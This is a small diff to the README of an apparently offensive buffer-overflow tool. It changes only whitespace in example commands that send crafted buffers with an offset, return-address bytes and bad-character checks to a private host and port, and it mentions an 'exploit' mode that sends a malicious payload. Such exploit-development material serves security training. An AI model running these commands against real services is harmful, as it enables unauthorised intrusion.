@@ -24,7 +24,7 @@ write - Writes hex value to buffer offset
 write - Write badchars (before or after offset content) for badchar verification
 ```
 ./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --badchar=after --exclude=000a
- ./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --badchar=before --exclude=000a --reversejmp=800
+./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --badchar=before --exclude=000a --reversejmp=800
 ```
 
 exploit - Sends malicious payload via buffer overflow
